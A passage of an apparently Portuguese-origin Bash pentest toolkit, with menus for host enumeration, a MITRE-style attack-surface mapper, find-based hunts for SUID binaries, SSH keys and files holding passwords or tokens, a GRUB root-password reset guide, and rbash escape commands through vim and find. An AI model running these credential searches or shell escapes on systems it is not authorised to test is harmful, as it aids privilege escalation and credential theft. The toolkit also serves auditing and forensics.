            display_command  "route"
            display_command "ip route"
            
            subtitle;  # Add a decorative subtitle
        }

        # Function to display persistent network configuration information
        function network_configuration_info() {
            display_section_no_log "PERSISTENT NETWORK CONFIGURATION"
            echo -e "${GRENN} In ${RED}Debian-based${RESET} systems, the persistent network configuration is located in: ${RED}/etc/network/interfaces${RESET}"
            echo
            echo -e "${GRENN} In ${RED}Red Hat-based${RESET} systems, network configurations are stored in: ${RED}/etc/sysconfig/network-scripts${RESET}"
            echo
            subtitle;  # Add a decorative subtitle
        }

        # Main execution workflow
        function useful_commands_workflow() {
            display_banner_inside_functions
            network_management_commands
            connection_monitoring_commands
            routing_commands
            network_configuration_info
            exit_to_main_menu
        }

        # Execute workflow
        useful_commands_workflow
    }

    # Function: Collects system & network reconnaissance data
    function linux_sysinfo() {
        # linux_sysinfo - Comprehensive Linux System & Network Reconnaissance
            #
            # Description:
            #   This script collects detailed local system and network information for reconnaissance.
            #   It provides insights into:
            #   - OS details, active processes, services, kernel modules, and virtualization indicators.
            #   - Installed security & utility tools, package managers, and cron jobs.
            #   - Network interfaces, open ports, routing table, DNS servers, firewall status.
            #   - Active SSH sessions, sudo users, failed logins, and USB device history.
            #
            # Output:
            #   - Displays results on-screen.
            #   - Saves results to a structured log file for later analysis.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-25
            # Last Updated: 2025-02-02
            # Version: 3.1
            #
            # Usage:
            #   Run this function to gather in-depth reconnaissance data on a system.
            #
            # Notes:
            #   - Pentesting: Identify misconfigurations & attack surfaces.
            #   - Forensics: Analyze system state after an incident.
            #   - Sysadmins: Troubleshoot & monitor system health.
            #   - Requires root privileges for some commands.
            #
            # Key Features:
            #   System Information: OS, Kernel, Virtualization, Services
            #   Network Information: Interfaces, Routing, ARP, Open Ports
            #   Security Enumeration: Installed Tools, Firewall, SSH Sessions
            #   User & Access Logs: Sudo Users, Failed Logins, Cron Jobs
            #   Utility Detection: System Tools, Debugging, File Transfers
            #   Attack Surface Mapping: Highlights potential security risks
            #
            #  Recent Updates:
            #   - v3.1: Integrated Attack Surface Mapping for Red Team operations
            #   - v3.0: Expanded User & Access Logs (sudo users, failed logins)
            #   - v2.9: Added Firewall Enumeration & Virtualization Detection
            #   - v2.8: Improved Network Recon (ARP, Routing, Open Ports)
            #



        title="Linux System Enumeration"  # Define the title for this operation

        function create_log_file() {
            LOG_DIR="./logs"
            if [ ! -d "$LOG_DIR" ]; then
                mkdir -p "$LOG_DIR"
            fi
            LOG_FILE="${LOG_DIR}/sysinfo_$(date +%d%m%Y_%H%M%S).log"
            echo "System enumeration log file: $LOG_FILE" >> "$LOG_FILE"
            echo "Reconnaissance recorded at: $(date)" >> "$LOG_FILE"
            echo "===========================================================">> "$LOG_FILE"
        }

        function all_system_enumeration() {
            
            function system_information() {
                display_section "SYSTEM INFORMATION"
                    log_and_display "=== Kernel ===\n$(uname -r)"
                    log_and_display "=== OS Info ===\n$(lsb_release -a 2>/dev/null || cat /etc/os-release)"
                    log_and_display "=== System Uptime ===\n$(uptime -p)"
            }

            function network_information() {
                display_section "NETWORK INFORMATION"
                    log_and_display "=== Hostname ===\n$(hostname)"
                    log_and_display "=== Domain ===\n$(hostname -d 2>/dev/null || echo 'N/A')"
                    log_and_display "=== Network Interfaces ===\n$(ip -br a)"
            }

            function open_ports() {
                display_section "OPEN PORTS"
                    log_and_display "=== Top 10 Listening Ports ===\n$(ss -lntp | head -10)"
            }

            function active_process(){
                display_section "ACTIVE PROCESSES"
                    log_and_display "=== Top 10 Processes ===\n$(ps -ef | head -10)"
            }

            function installed_security_tools() {
                display_section "INSTALLED SECURITY TOOLS"
                if command -v dpkg &>/dev/null; then
                    log_and_display "=== Security Tools (Debian-based) ===\n$(dpkg -l | grep -E 'nmap|wireshark|metasploit|tcpdump|aircrack-ng|john|hydra|hashcat|tshark|amass|recon-ng|theharvester|dirb|gobuster|nikto|burpsuite|sqlmap|ettercap|bettercap|kismet|reaver|radare2|ghidra|exploitdb')"
                elif command -v rpm &>/dev/null; then
                    log_and_display "=== Security Tools (Red Hat-based) ===\n$(rpm -qa | grep -E 'nmap|wireshark|metasploit|tcpdump|aircrack-ng|john|hydra|hashcat|tshark|amass|recon-ng|theharvester|dirb|gobuster|nikto|burpsuite|sqlmap|ettercap|bettercap|kismet|reaver|radare2|ghidra|exploitdb')"
                elif command -v pacman &>/dev/null; then
                    log_and_display "=== Security Tools (Arch-based) ===\n$(pacman -Q | grep -E 'nmap|wireshark|metasploit|tcpdump|aircrack-ng|john|hydra|hashcat|tshark|amass|recon-ng|theharvester|dirb|gobuster|nikto|burpsuite|sqlmap|ettercap|bettercap|kismet|reaver|radare2|ghidra|exploitdb')"
                elif command -v apk &>/dev/null; then
                    log_and_display "=== Security Tools (Alpine-based) ===\n$(apk list --installed | grep -E 'nmap|wireshark|metasploit|tcpdump|aircrack-ng|john|hydra|hashcat|tshark|amass|recon-ng|theharvester|dirb|gobuster|nikto|burpsuite|sqlmap|ettercap|bettercap|kismet|reaver|radare2|ghidra|exploitdb')"
                else
                    log_and_display "Package manager not found. Cannot list installed security tools."
                fi
            }

            function routing_table() {
                display_section "ROUTING TABLE"
                    log_and_display "=== Routing Table ===\n$(route -n)"
                    log_and_display "=== IP Route ===\n$(ip route show)"
            }

            function active_connections() {
                display_section "ACTIVE CONNECTIONS"
                    log_and_display "=== Top 25 TCP & UDP Connections ===\n$(ss -tunap | head -25)"
            }

            function arp_table(){
                display_section "ARP TABLE"
                    log_and_display "=== ARP Table ===\n$(arp -a)"
                    log_and_display "=== IP Neighbors ===\n$(ip neigh show)"
            }

            function dns_servers(){
                display_section "DNS SERVERS"
                    log_and_display "=== DNS Servers ===\n$(cat /etc/resolv.conf | grep nameserver)"
                    log_and_display "=== Current DNS Servers ===\n$(grep nameserver /etc/resolv.conf)"
            }

            function firewall_rules(){
                display_section "FIREWALL RULES"
                    if command -v iptables &>/dev/null; then
                        log_and_display "=== Firewall Rules ===\n$(iptables -L -n -v)"
                    elif command -v ufw &>/dev/null; then
                        log_and_display "=== Firewall Rules ===\n$(ufw status)"
                    else
                        log_and_display "Firewall management tool not found."
                    fi
            }

            function users_list(){
                display_section "USERS LIST"
                    log_and_display "=== Users List ===\n$(cat /etc/passwd)"
            }

            function cpu_memory_info() {
                display_section "CPU & MEMORY INFO"
                    log_and_display "=== CPU Information ===\n$(lscpu | grep 'Model name\|CPU MHz')"
                    log_and_display "=== Memory Usage ===\n$(free -h)"
            }

            function running_services() {
                display_section "ACTIVE SERVICES"
                    log_and_display "=== Running Systemd Services ===\n$(systemctl list-units --type=service --state=running | head -15)"
            }

            function sudo_users() {
                display_section "USERS WITH SUDO PRIVILEGES"
                    log_and_display "=== Sudo-Enabled Users ===\n$(grep '^sudo:.*$' /etc/group | cut -d: -f4)"
                    log_and_display "=== Root-owned User Accounts ===\n$(awk -F: '$3 == 0 {print $1}' /etc/passwd)"
            }

            function active_ssh_sessions() {
                display_section "ACTIVE SSH SESSIONS"
                    log_and_display "=== SSH Users ===\n$(who | grep 'pts' || echo 'No active SSH sessions.')"
            }

            function failed_logins() {
                display_section "FAILED LOGIN ATTEMPTS"
                
                if [ -f /var/log/auth.log ]; then
                    log_and_display "=== Failed Logins (Debian-based) ===\n$(grep 'Failed password' /var/log/auth.log | tail -20)"
                elif [ -f /var/log/secure ]; then
                    log_and_display "=== Failed Logins (Red Hat-based) ===\n$(grep 'Failed password' /var/log/secure | tail -20)"
                elif command -v journalctl &>/dev/null; then
                    log_and_display "=== Failed Logins (Systemd-based) ===\n$(journalctl -u sshd --no-pager | grep 'Failed password' | tail -20)"
                else
                    log_and_display "No logs found for failed login attempts."
                fi
            }    

            function kernel_modules() {
                display_section "LOADED KERNEL MODULES"
                    log_and_display "=== Active Kernel Modules ===\n$(lsmod | head -15)"
            }

            function virtualization_check() {
                display_section "VIRTUALIZATION & CONTAINER DETECTION"
                    log_and_display "=== Virtualization Type ===\n$(systemd-detect-virt 2>/dev/null || echo 'No virtualization detected.')"
                    log_and_display "=== Running Inside Docker? ===\n$(cat /proc/1/cgroup | grep -i docker || echo 'Not inside a Docker container.')"
            }

            function cron_jobs() {
                display_section "SCHEDULED TASKS & CRON JOBS"
                    log_and_display "=== User Cron Jobs ===\n$(crontab -l 2>/dev/null || echo 'No user crontabs found.')"
                    log_and_display "=== System-Wide Cron Jobs ===\n$(ls -la /etc/cron* 2>/dev/null)"
            }

            function usb_devices() {
                display_section "CONNECTED USB DEVICES"
                    log_and_display "=== USB Devices ===\n$(lsusb || echo 'No USB devices found.')"
            }

            function utilities_softwares() {
                display_section "INSTALLED UTILITY SOFTWARE"
                    log_and_display "=== Common System Utilities ===\n$(which curl wget nano vim tmux screen htop atop lsof strace tcpdump 2>/dev/null | sed 's/^/ - /')"
                    log_and_display "=== Compression & Archiving Tools ===\n$(which tar zip unzip gzip bzip2 7z 2>/dev/null | sed 's/^/ - /')"
                    log_and_display "=== Programming Languages & Interpreters ===\n$(which python python3 perl ruby php gcc clang make 2>/dev/null | sed 's/^/ - /')"
                    log_and_display "=== Debugging & Forensics Tools ===\n$(which gdb ldd objdump strings hexdump radare2 2>/dev/null | sed 's/^/ - /')"
                    log_and_display "=== System Monitoring & Performance ===\n$(which top iotop iftop nload sar dstat vmstat sysstat 2>/dev/null | sed 's/^/ - /')"
                    log_and_display "=== Network Diagnostic Tools ===\n$(which ping traceroute whois dig nslookup arp-scan netcat socat 2>/dev/null | sed 's/^/ - /')"
                    log_and_display "=== File Transfer & Remote Access ===\n$(which rsync scp ssh ftp sftp smbclient rclone 2>/dev/null | sed 's/^/ - /')"
                    log_and_display "=== Package Managers ===\n$(which apt yum dnf pacman zypper snap flatpak 2>/dev/null | sed 's/^/ - /')"
            }

            function all_sysenum_caller(){
                ### SYSTEM INFORMATION ###
                system_information
                cpu_memory_info
                kernel_modules
                virtualization_check

                ### USER & ACCESS CONTROL ###
                users_list
                sudo_users
                active_ssh_sessions
                failed_logins

                ### NETWORK & CONNECTIVITY ###
                network_information
                open_ports
                running_services
                active_connections
                firewall_rules
                routing_table
                arp_table
                dns_servers

                ### HARDWARE & DEVICES ###
                usb_devices

                ### TASK AUTOMATION & SCHEDULING ###
                cron_jobs

                ### SECURITY TOOLS & UTILITIES ###
                installed_security_tools
                utilities_softwares
                attack_surface_analysis
            }

            # Function: attack_surface_analysis - Map Installed Tools to Attack Vectors
            function attack_surface_analysis() {
                display_section "ATTACK SURFACE ANALYSIS"

                # Define MITRE ATT&CK Categories
                declare -A ATTACK_CATEGORIES=(
                    ["Privilege Escalation"]="kernel exploits, SUID binaries, sudo misconfigs"
                    ["Lateral Movement"]="SSH keys, SMB tools, RDP clients"
                    ["Persistence"]="cron jobs, SSH backdoors, startup scripts"
                    ["Defense Evasion"]="log tampering, anti-forensics tools"
                    ["Exfiltration"]="scp, rsync, netcat, curl"
                    ["Credential Dumping"]="Mimikatz, hashes, SAM extraction"
                    ["Container & Cloud Exploits"]="Docker misconfigs, AWS CLI abuse"
                    ["Network Reconnaissance"]="Nmap, Wireshark, Tcpdump, Gobuster"
                )

                # Check system for attack vectors
                function analyze_attack_surface() {
                
                    # Function to check for installed tools
                    function check_installed_tools() {
                        local tools=("$@")
                        local found_tools=""
                        for tool in "${tools[@]}"; do
                            if command -v "$tool" &>/dev/null; then
                                found_tools+="$tool "
                            fi
                        done
                        echo -e "$found_tools\n"
                    }

                    for category in "${!ATTACK_CATEGORIES[@]}"; do
                        echo -e "=== $category ===" | tee -a "$LOG_FILE"

                        case "$category" in
                            "Privilege Escalation")
                                check_installed_tools "sudo" "gcc" "make" "setcap" "capsh" "pkexec" \
                                    | tee -a "$LOG_FILE"
                                ;;
                            "Lateral Movement")
                                check_installed_tools "ssh" "smbclient" "rdesktop" "xfreerdp" \
                                    | tee -a "$LOG_FILE"
                                ;;
                            "Persistence")
                                check_installed_tools "crontab" "systemctl" "rc.local" "init.d" \
                                    | tee -a "$LOG_FILE"
                                ;;
                            "Defense Evasion")
                                check_installed_tools "shred" "wipe" "logrotate" "chattr" \
                                    | tee -a "$LOG_FILE"
                                ;;
                            "Exfiltration")
                                check_installed_tools "scp" "rsync" "netcat" "curl" \
                                    | tee -a "$LOG_FILE"
                                ;;
                            "Credential Dumping")
                                check_installed_tools "mimikatz" "john" "hashcat" "secretsdump.py" \
                                    | tee -a "$LOG_FILE"
                                ;;
                            "Container & Cloud Exploits")
                                check_installed_tools "docker" "kubectl" "aws" "gcloud" "az" \
                                    | tee -a "$LOG_FILE"
                                ;;
                            "Network Reconnaissance")
                                check_installed_tools "nmap" "wireshark" "tcpdump" "gobuster" "amass" \
                                    | tee -a "$LOG_FILE"
                                ;;
                        esac
                    done
                }

                # Run the analysis
                analyze_attack_surface
            }

            # Call all the enumeration functions
            all_sysenum_caller
        }

        function log_info() {
            subtitle
            echo
            echo -e "${CYAN}System enumeration log file saved as ${GREEN}$LOG_FILE${RESET}${CYAN} in ${GREEN}$LOG_DIR${RESET}"
            echo
            subtitle
        }

        # Main execution workflow
        function sysinfo_workflow() {
            display_banner_inside_functions
            create_log_file
            all_system_enumeration
            log_info
            exit_to_main_menu
        }

        # Execute workflow
        sysinfo_workflow
    }

    # Function: Find-base attack surface analysis
    function find_based_attack_surface_analysis() {
        # find_based_attack_surface_analysis - Automates Attack Surface Discovery using 'find'
            #
            # Description:
            #   Automates system reconnaissance by searching for sensitive files, privilege escalation paths,
            #   and hidden persistence mechanisms using the 'find' command.
            #
            # Key Features:
            #   - Detects SUID/SGID binaries for Privilege Escalation
            #   - Identifies world-writable or unowned files for exploitation
            #   - Finds SSH keys, password files, and sensitive data for credential theft
            #   - Locates hidden files, unusual permissions, and suspicious cron jobs
            #   - Logs findings for Red Team and Forensics investigations
            #
            # Output:
            #   - Displays results on-screen
            #   - Saves findings to a structured log file
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-25
            # Last Updated: 2025-01-30
            # Version: 2.0
            #
            # Usage:
            #   Run this function to automatically scan a system for attack vectors or forensic analysis.
            #
            # Notes:
            #   - Red Team: Helps identify misconfigurations & exploitation opportunities.
            #   - Forensics: Helps detect persistence, exfiltration traces, and privilege abuse.
            #   - Requires root privileges for full execution.
            # Create log directory & file
        title="Find-Based Attack Surface Analysis"  # Define the title for this operation
        
        function find_analysis_create_log_file() {
            LOG_DIR="./logs"
            mkdir -p "$LOG_DIR"
            LOG_FILE="${LOG_DIR}/find_analysis_$(date +%d%m%Y_%H%M%S).log"
            echo "Find-Based Attack Surface Analysis Log - $(date)" > "$LOG_FILE"
            echo "===============================================" >> "$LOG_FILE"
        }

        function all_find_based_attack_functions() {
            
            # Privilege Escalation Checks
            function privilege_escalation_checks() {
                log_and_display "=== Searching for SUID/SGID binaries (Potential Privilege Escalation) ==="
                    find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            # World-Writable & Unowned Files
            function world_writable_unowned_files() {
                log_and_display "=== Searching for World-Writable Files (Top 500) ==="
                    find / -type f -perm -o+w -exec ls -la {} 2>/dev/null \; | head -n 500 | tee -a "$LOG_FILE"
                log_and_display "=== Searching for Unowned Files (Top 500) ==="
                    find / -nouser -o -nogroup -exec ls -la {} 2>/dev/null \; | head -n 500 | tee -a "$LOG_FILE"
            }

            # Credential Discovery
            function credential_discovery() {
                log_and_display "=== Searching for SSH Keys ==="
                    find / -type f -name "id_rsa*" 2>/dev/null | tee -a "$LOG_FILE"
                log_and_display "=== Searching for Useful Files (Config files) ==="
                    find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.cfg" -name "*.log" -o -name "*.db" -o -name "*.pem"  \)  -exec grep -i "password" {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            # Persistence Mechanisms
            function persistence_mechanisms() {
                log_and_display "=== Searching for Suspicious Cron Jobs ==="
                    find /etc/cron* -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
                log_and_display "=== Searching for Startup Scripts (init.d, systemd, .bashrc) ==="
                    find /etc/init.d /lib/systemd/system ~/.bashrc -type f -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            # Hidden Files & Anti-Forensics
            function hidden_files_detection() {
                log_and_display "=== Searching for Hidden Files ==="
                    find / \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path /snap -o -path /var/lib/docker \) -prune -o -type f -name ".*" 2>/dev/null | tee -a "$LOG_FILE"
                log_and_display "=== Searching for Files with Strange Timestamps ==="
                    timeout 600s find / -type f -newermt "2025-01-01" -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            # Exfiltration Traces
            function exfiltration_traces() {
                log_and_display "=== Searching for Large Archive Files (Potential Data Exfiltration) ==="
                    timeout 600s find / -type f \( -name "*.zip" -o -name "*.tar" -o -name "*.gz" -o -name "*.7z" \) -size +50M -exec ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
                log_and_display "=== Searching for Files Accessed in the Last 24 Hours ==="
                    find / -type f -atime -1 -size -5M -exec  ls -la {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            function log_tampering_detection() {
                log_and_display "=== Searching for Recently Modified Logs ==="
                    find /var/log -type f -mtime -1 -exec ls -lah {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            function sensitive_file_discovery() {
                log_and_display "=== Searching for Sensitive Files (API Keys, Credentials, Configs) ==="
                    find / -type f \( -name '*.json' -o -name '*.yaml' -o -name '*.env' -o -name '*.ini' \) -exec grep -Ei 'senha|pass|password|secret|apikey|token' {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            function suspicious_executables_scripts() {
                log_and_display "=== Searching for Suspicious Executables & Scripts ==="
                    find /tmp /dev/shm /var/tmp -type f -executable -exec ls -lah {} 2>/dev/null \; | tee -a "$LOG_FILE"
            }

            function container_cloud_artifacts() {
                log_and_display "=== Searching for Cloud & Container Credentials ==="
                    find / -type f \( -name 'config.json' -o -name 'credentials' -o -name '.dockercfg' -o -name '.kube/config' \) 2>/dev/null | tee -a "$LOG_FILE"
            }

            function caller_functions(){
                privilege_escalation_checks
                world_writable_unowned_files
                credential_discovery
                persistence_mechanisms
                hidden_files_detection
                exfiltration_traces
                log_tampering_detection
                sensitive_file_discovery
                suspicious_executables_scripts
                container_cloud_artifacts
            }

            caller_functions;

        }

        # Automated Execution of All Checks
        function find_based_analysis_workflow() {
            display_banner_inside_functions
            all_find_based_attack_functions
            log_and_display "=== Analysis Complete! Results saved to: $LOG_FILE ==="
        }

        # Execute the workflow
        find_based_analysis_workflow
    }

    # Function: Find command examples
    function find_command_examples() {

        # find_command_examples - Display examples of the 'find' command for reconnaissance & automation
            #
            # Description:
            #   This function provides quick reference examples of using 'find' for:
            #   - File discovery, privilege escalation, and hidden files detection.
            #   - Searching based on permissions, user, group, modification/access times.
            #   - Executing commands on discovered files.
            #
            # Notes:
            #   - Useful for Red Teamers & Forensics Investigators.
            #   - Helps automate common search operations.
            #   - No actual scanning—this is just a reference tool.
            #
            # Author: R3v4N (w/GPT)
            # Last Updated: 2025-02-01
            # Version: 2.0

        title="\tFind Command Examples"  # Define the title for this operation
        function display_find_usage_section() {
            local title="$1"
            echo -e "${RED}# $title${RESET}"
            echo
        }

        function all_find_examples(){
            
            function list_all_files() {
                display_find_usage_section "List All Files in a Directory"
                echo -e "${GREEN}$ find .${RESET}"
                echo
            }

            function find_files_by_maxdepth() {
                display_find_usage_section "Find Files with Limited Depth"
                echo -e "${GREEN}$ find /etc -maxdepth 1 -name '*.sh'${RESET}"
                echo
            }

            function find_specific_files() {
                display_find_usage_section "Find Files by Name"
                echo -e "${GREEN}$ find ./test -type f -name '<file*>'${RESET}"
                echo
            }

            function find_specific_directories() {
                display_find_usage_section "Find Directories by Name"
                echo -e "${GREEN}$ find ./test -type d -name '<directory*>'${RESET}"
                echo
            }

            function find_hidden_files() {
                display_find_usage_section "Find Hidden Files"
                echo -e "${GREEN}$ find ~ -type f -name '.*'${RESET}"
                echo
            }

            function find_by_permissions() {
                display_find_usage_section "Find Files by Permissions"
                echo -e "${GREEN}$ find / -type f -perm 0740 -exec ls -la {} 2>/dev/null \;${RESET}"
                echo -e "${GREEN}$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;  # Find SUID files${RESET}"
                echo
            }

            function find_by_user_group() {
                display_find_usage_section "Find Files by User or Group"
                echo -e "${GREEN}$ find . -user msfadmin${RESET}"
                echo -e "${GREEN}$ find . -user msfadmin -name '*.txt'${RESET}"
                echo -e "${GREEN}$ find . -group adm${RESET}"
                echo
            }

            function find_by_time() {
                display_find_usage_section "Find Files Modified/Accessed in the Last N Days"
                echo -e "${GREEN}$ find / -mtime 5${RESET}  # Modified in the last 5 days"
                echo -e "${GREEN}$ find / -atime 5${RESET}  # Accessed in the last 5 days"
                echo
            }

            function find_and_execute() {
                display_find_usage_section "Find and Execute Commands"
                echo -e "${GREEN}$ find / -name '*.pdf' -type f -exec ls -lah {} \;${RESET}"
                echo
            }

            function call_find_examples() {
                list_all_files
                find_files_by_maxdepth
                find_specific_files
                find_specific_directories
                find_hidden_files
                find_by_permissions
                find_by_user_group
                find_by_time
                find_and_execute
            }

            call_find_examples
        }

        function find_examples_workflow() {
            display_banner_inside_functions
            all_find_examples
            exit_to_main_menu
        }

        find_examples_workflow
    }

    # linux_root_password_reset - Interactive Guide for Resetting Root Password via GRUB
    function linux_root_password_reset() {

        title="\tLinux Root Password Reset via GRUB"  # Define the title for this operation

        # Define Reset Instructions for Each OS
        function generate_reset_steps() {
            local file="/tmp/root_reset_steps.txt"
            echo "======================" > "$file"
            echo "  ROOT PASSWORD RESET  " >> "$file"
            echo "======================" >> "$file"

            echo -e "\n[Debian/Ubuntu]" >> "$file"
            echo "  1. Restart the system." >> "$file"
            echo "  2. Press 'e' at the GRUB menu." >> "$file"
            echo "  3. Find the line starting with: linux boot..." >> "$file"
            echo "  4. Replace 'ro quiet' with 'init=/bin/bash rw'" >> "$file"
            echo "  5. Press Ctrl + X to boot." >> "$file"
            echo "  6. Run: passwd root" >> "$file"
            echo "  7. Reboot: reboot -f" >> "$file"

            echo -e "\n[Red Hat (CentOS, Fedora, Alma, Rocky)]" >> "$file"
            echo "  1. Restart the system." >> "$file"
            echo "  2. Press 'e' at the GRUB menu." >> "$file"
            echo "  3. Find the line starting with: linux16..." >> "$file"
            echo "  4. Replace 'rghb quiet LANG=en_US.UTF-8' with 'init=/bin/bash rw'" >> "$file"
            echo "  5. Press Ctrl + X to boot." >> "$file"
            echo "  6. If SELinux blocks changes, run: setenforce 0" >> "$file"
            echo "  7. Run: passwd root" >> "$file"
            echo "  8. Reboot: reboot -f" >> "$file"

            echo -e "\n[Arch Linux]" >> "$file"
            echo "  1. Restart the system." >> "$file"
            echo "  2. Press 'e' at the GRUB menu." >> "$file"
            echo "  3. Locate the line starting with: linux ..." >> "$file"
            echo "  4. Add 'init=/bin/bash' at the end of the line." >> "$file"
            echo "  5. Press Ctrl + X to boot." >> "$file"
            echo "  6. Run: mount -o remount,rw /" >> "$file"
            echo "  7. Run: passwd root" >> "$file"
            echo "  8. Reboot: reboot -f" >> "$file"

            echo -e "\n[SUSE/OpenSUSE]" >> "$file"
            echo "  1. Restart the system." >> "$file"
            echo "  2. Press 'e' at the GRUB menu." >> "$file"
            echo "  3. Locate the line starting with: linux ..." >> "$file"
            echo "  4. Replace 'quiet' with 'init=/bin/bash'" >> "$file"
            echo "  5. Press Ctrl + X to boot." >> "$file"
            echo "  6. Run: passwd root" >> "$file"
            echo "  7. Reboot: reboot -f" >> "$file"

            echo -e "\n[FreeBSD]" >> "$file"
            echo "  1. Restart the system." >> "$file"
            echo "  2. At the boot menu, press 'Esc' for the loader prompt." >> "$file"
            echo "  3. Type: boot -s" >> "$file"
            echo "  4. When prompted for a shell, press 'Enter'." >> "$file"
            echo "  5. Remount root filesystem as read-write: mount -u /" >> "$file"
            echo "  6. Run: mount -a" >> "$file"
            echo "  7. Run: passwd root" >> "$file"
            echo "  8. Reboot: reboot" >> "$file"

            echo "======================" >> "$file"
            echo " File saved to: $file"
        }

        # Generate a QR Code with Steps
        function generate_qr_code() {
            if command -v qrencode &>/dev/null; then
                cat /tmp/root_reset_steps.txt | qrencode -o /tmp/root_reset_qr.png
                echo -e "${GREEN}QR Code saved to /tmp/root_reset_qr.png.${RESET}"
                echo -e "${GRAY}Scan it with your phone before rebooting.${RESET}"
            else
                echo -e "${RED}qrencode not installed. Install and try again. Skipping QR code generation.${RESET}"
            fi
        }

        # Option to Print Steps (if physical access)
        function print_instructions() {
            if command -v lp &>/dev/null; then
                lp /tmp/root_reset_steps.txt
                echo -e "${GREEN}Instructions sent to printer.${RESET}"
            else
                echo -e "${YELLOW}No printer detected. Skipping print.${RESET}"
            fi
        }

        # Display Instructions on Screen
        function submenu_linux_root_password_reset() {
            clear
            display_banner_inside_functions
            generate_reset_steps
            echo
            echo -e "${MAGENTA} [0] Generate Instructions${RESET}"
            echo -e "${MAGENTA} [1] Generate QR Code${RESET}"
            echo -e "${MAGENTA} [2] Print Instructions${RESET}"
            echo -e "${MAGENTA} [3] Print in Screen${RESET}"
            echo -e "${MAGENTA} [4] Exit to Main Menu${RESET}"
            echo
            echo -ne "${GREEN} Choose an option: ${RESET}"
            read -r option
            echo
            case $option in
                0) generate_reset_steps ;;
                1) generate_qr_code ;;
                2) print_instructions ;;
                3) main ;;
                *) echo -e "${RED} Invalid choice.${RESET}"; sleep 2; display_instructions ;;
            esac
        }

        # Main Execution
        submenu_linux_root_password_reset
        }




#! TODO: UPDATE ALL BELOW HERE. The main objective is translate to english and if necessary, refactor the code.

    # Definição da função xvi_vim_memento
    function xvi_vim_memento(){
        # Limpa a tela
        clear

        # Exibe cabeçalho do lembrete de uso do Vim
        echo -e "${GREEN}============= LEMBRETE DE USO DO VIM =============${RESET}"
        echo

        # Inserção de texto
        echo -e "${YELLOW}Inserção de texto:${RESET}"
        echo -e "Pressione 'i' para entrar no modo de inserção."

        # Salvar e sair
        echo -e "\n${YELLOW}Salvar e sair:${RESET}"
        echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':wq' para salvar e sair."

        # Sair sem salvar
        echo -e "\n${YELLOW}Sair sem salvar:${RESET}"
        echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':q!' para sair sem salvar."

        # Movimentação pelo texto
        echo -e "\n${YELLOW}Movimentação pelo texto:${RESET}"
        echo -e "Use as teclas de seta ou as teclas 'h', 'j', 'k' e 'l' para mover o cursor."

        # Excluir texto
        echo -e "\n${YELLOW}Excluir texto:${RESET}"
        echo -e "Pressione 'x' para excluir o caractere sob o cursor."

        # Desfazer e refazer
        echo -e "\n${YELLOW}Desfazer e Refazer:${RESET}"
        echo -e "Pressione 'u' para desfazer e 'Ctrl + r' para refazer."

        # Buscar e substituir
        echo -e "\n${YELLOW}Buscar e Substituir:${RESET}"
        echo -e "Digite '/' para iniciar a busca. Para substituir, use ':s/palavra/nova_palavra/g'."

        # Ajuda
        echo -e "\n${YELLOW}Ajuda:${RESET}"
        echo -e "Digite ':help' para obter ajuda."

        # Exibe rodapé do lembrete de uso do Vim
        echo -e "\n${GREEN}===================================================${RESET}"
        echo

        # Mensagem para pressionar ENTER para continuar
        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
        read -r 2> /dev/null

        # Chamada da função principal do menu principal após pressionar ENTER
        main_menu;
    }

    # Definição da função principal xvii_tec_esc_rbash
    function xvii_tec_esc_rbash(){

        # Definição da função vim_escape_rbash
        function vim_escape_rbash(){
            # Comando do Vim para escapar do rbash
            local vim_comando="vim.tiny -E -c :\!/bin/sh"

            # Verificar se o konsole está instalado
            if command -v konsole &> /dev/null; then
                    # KDE (Konsole)
                    konsole --hold -e "${vim_comando}"
            else
                # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
                if command -v gnome-terminal &> /dev/null; then
                    # Ubuntu (Gnome Terminal)
                    gnome-terminal -- "${vim_comando}"
                elif command -v xfce4-terminal &> /dev/null; then
                    # Xubuntu (Xfce Terminal)
                    xfce4-terminal --execute "${vim_comando}"
                elif command -v tilix &> /dev/null; then
                    # Tilix está instalado
                    tilix --action=app-new-window "${vim_comando}"
                elif command -v xterm &> /dev/null; then
                    # Terminal genérico (xterm)
                    xterm -e "${vim_comando}"
                else
                    # Nenhum terminal padrão encontrado
                    echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                    exit 1
                fi
            fi
        }

        # Definição da função find_escape_rbash
        function find_escape_rbash(){
            # Comando find para escapar do rbash
            local find_comando="find . -exec /bin/sh \; -quit"

            # Verificar se o Tilix está instalado
            if command -v tilix &> /dev/null; then
                # Tilix está instalado, abrir uma nova sessão do Tilix
                tilix --action=app-new-window "${find_comando}"
            else
                # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
                if command -v gnome-terminal &> /dev/null; then
                    # Ubuntu (Gnome Terminal)
                    gnome-terminal -- "${find_comando}"
                elif command -v xfce4-terminal &> /dev/null; then
                    # Xubuntu (Xfce Terminal)
                    xfce4-terminal --execute "${find_comando}"
                elif command -v konsole &> /dev/null; then
                    # KDE (Konsole)
                    konsole --hold -e "${find_comando}"
                elif command -v xterm &> /dev/null; then
                    # Terminal genérico (xterm)
                    xterm -e "${find_comando}"
                else
                    # Nenhum terminal padrão encontrado
                    echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                    exit 1
                fi
            fi
        }

        # Definição da função man_escape_rbash
        function man_escape_rbash(){
            # Comando man para escapar do rbash
            local man_comando="echo 'Para escapar do rbash, logo apos o man iniciar, digite \!sh. Para continuar, aperte enter' && read && man man"

            # Verificar se o Tilix está instalado
            if command -v tilix &> /dev/null; then
